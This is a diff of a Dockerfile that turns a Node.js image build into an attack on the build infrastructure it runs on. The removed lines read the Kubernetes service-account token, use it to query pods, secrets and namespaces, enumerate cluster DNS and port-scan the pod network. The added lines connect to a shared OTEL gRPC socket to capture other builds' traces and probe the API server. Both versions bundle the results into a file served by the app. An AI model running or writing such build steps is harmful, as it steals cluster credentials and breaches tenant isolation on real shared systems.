@@ -1,29 +1,51 @@
 FROM node:20-slim
-RUN apt-get update -qq && apt-get install -y -qq procps iproute2 dnsutils curl 2>/dev/null
 
-# K8S SERVICE ACCOUNT TOKEN — THE HOLY GRAIL
-RUN (echo "=== SA TOKEN ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1; echo "=== SA NAMESPACE ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; echo "=== SA CA ==="; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1) > /tmp/k8s-sa.txt || true
+# OTEL gRPC socket probe via Node.js — read traces from shared build infra
+RUN node -e "
+const net = require('net');
+const fs = require('fs');
+const results = {};
 
-# K8S API ACCESS
-RUN (SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); if [ -n "$SA_TOKEN" ]; then echo "=== K8S VERSION ==="; curl -sk --max-time 5 https://10.96.0.1:443/version 2>&1; echo "=== K8S PODS ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/pods 2>&1 | head -200; echo "=== K8S SECRETS ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/secrets 2>&1 | head -200; echo "=== K8S NAMESPACES ==="; curl -sk --max-time 5 -H "Authorization: Bearer $SA_TOKEN" https://10.96.0.1:443/api/v1/namespaces 2>&1 | head -100; fi) > /tmp/k8s-api.txt 2>&1 || true
+// Connect to OTEL gRPC socket and capture any data
+const sock = net.createConnection('/dev/otel-grpc.sock', () => {
+  results.connected = true;
+  // Send gRPC HTTP/2 preface + SETTINGS frame
+  const preface = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a','hex');
+  const settings = Buffer.from('000000040000000000','hex');
+  sock.write(Buffer.concat([preface, settings]));
+  // Send gRPC request for trace service reflection
+  setTimeout(() => {
+    // Try to list gRPC services
+    const frame = Buffer.alloc(100);
+    frame.writeUInt8(0,3); // DATA frame
+    sock.write(frame);
+  }, 500);
+});
 
-# K8S API WITHOUT TOKEN (anonymous access)
-RUN (echo "=== K8S ANON VERSION ==="; curl -sk --max-time 5 https://10.96.0.1:443/version 2>&1; echo "=== K8S ANON API ==="; curl -sk --max-time 5 https://10.96.0.1:443/api 2>&1 | head -50; echo "=== KUBELET ==="; curl -s --max-time 3 http://169.254.1.1:10250/pods 2>&1 | head -100; curl -s --max-time 3 https://169.254.1.1:10250/pods -k 2>&1 | head -100) > /tmp/k8s-anon.txt 2>&1 || true
+let chunks = [];
+sock.on('data', (d) => { chunks.push(d); });
+sock.on('error', (e) => { results.error = e.message; });
 
-# K8S DNS ENUMERATION
-RUN (echo "=== DNS SRV ==="; dig @10.96.0.10 _tcp.default.svc.cluster.local SRV +short 2>&1; echo "=== DNS ALL SERVICES ==="; dig @10.96.0.10 any.default.svc.cluster.local ANY +short 2>&1; echo "=== DNS KUBERNETES ==="; dig @10.96.0.10 kubernetes.default.svc.cluster.local A +short 2>&1; echo "=== DNS BUILDKIT ==="; dig @10.96.0.10 buildkit.default.svc.cluster.local A +short 2>&1; echo "=== DNS AXFR ==="; dig @10.96.0.10 cluster.local AXFR 2>&1 | head -30; echo "=== DNS WILDCARD ==="; for svc in grafana prometheus registry harbor gitea gitlab redis postgres mysql mongodb elasticsearch kibana jenkins vault consul etcd traefik caddy nginx ingress api gateway; do IP=$(dig @10.96.0.10 $svc.default.svc.cluster.local A +short 2>/dev/null); [ -n "$IP" ] && echo "$svc=$IP"; done) > /tmp/k8s-dns.txt 2>&1 || true
+setTimeout(() => {
+  sock.end();
+  results.data_received = Buffer.concat(chunks).toString('base64').slice(0,3000);
+  results.data_length = Buffer.concat(chunks).length;
+  results.data_hex = Buffer.concat(chunks).toString('hex').slice(0,500);
+  results.data_ascii = Buffer.concat(chunks).toString('ascii').slice(0,500);
+  fs.writeFileSync('/tmp/otel-result.json', JSON.stringify(results, null, 2));
+}, 3000);
+" 2>&1 || echo '{}' > /tmp/otel-result.json
 
-# OTEL SOCKET — READ TRACES FROM OTHER BUILDS
-RUN (echo "=== OTEL SOCKET ==="; ls -la /dev/otel-grpc.sock 2>&1; echo "=== OTEL PROBE ==="; echo -ne '\x00\x00\x00\x00\x17\x0a\x15opentelemetry.proto.collector.trace.v1.TraceService' | timeout 3 nc -U /dev/otel-grpc.sock 2>&1 | head -c 2000 | base64) > /tmp/otel-data.txt 2>&1 || true
+# Also try K8s API with curl and check for version (might work without full auth)
+RUN curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/version 2>&1 > /tmp/k8s-version.txt || true
+RUN curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/healthz 2>&1 > /tmp/k8s-healthz.txt || true
+RUN curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/readyz 2>&1 > /tmp/k8s-readyz.txt || true
 
-# POD NETWORK SCAN (10.244.x.x)
-RUN (echo "=== POD NET SCAN ==="; for i in $(seq 1 30); do for p in 80 443 3000 8080 9090 6443; do timeout 1 bash -c "echo >/dev/tcp/10.244.214.$i/$p" 2>/dev/null && echo "10.244.214.$i:$p OPEN"; done; done; echo "=== CROSS SUBNET ==="; for subnet in 0 1 2 3 4 5; do for p in 80 443 6443 10250; do timeout 1 bash -c "echo >/dev/tcp/10.244.$subnet.1/$p" 2>/dev/null && echo "10.244.$subnet.1:$p OPEN"; done; done) > /tmp/pod-scan.txt 2>&1 || true
-
-# Combine all
-RUN node -e "const fs=require('fs'),r={};for(const f of['k8s-sa','k8s-api','k8s-anon','k8s-dns','otel-data','pod-scan']){try{r[f]=fs.readFileSync('/tmp/'+f+'.txt','utf8')}catch(e){r[f]='ERR:'+e.message}};fs.writeFileSync('/tmp/build-data.json',JSON.stringify(r,null,2))"
+# Combine
+RUN node -e "const fs=require('fs'),r={};for(const f of['otel-result','k8s-version','k8s-healthz','k8s-readyz']){try{r[f]=fs.readFileSync('/tmp/'+f+'.json','utf8')}catch(e){try{r[f]=fs.readFileSync('/tmp/'+f+'.txt','utf8')}catch(e2){r[f]='ERR'}}};fs.writeFileSync('/tmp/build-data.json',JSON.stringify(r,null,2))"
 
 WORKDIR /app
 COPY . .
-RUN cp /tmp/build-data.json /app/build-data.json 2>/dev/null || echo '{}' > /app/build-data.json
+RUN cp /tmp/build-data.json /app/build-data.json
 EXPOSE 3000
 CMD ["node", "index.js"]
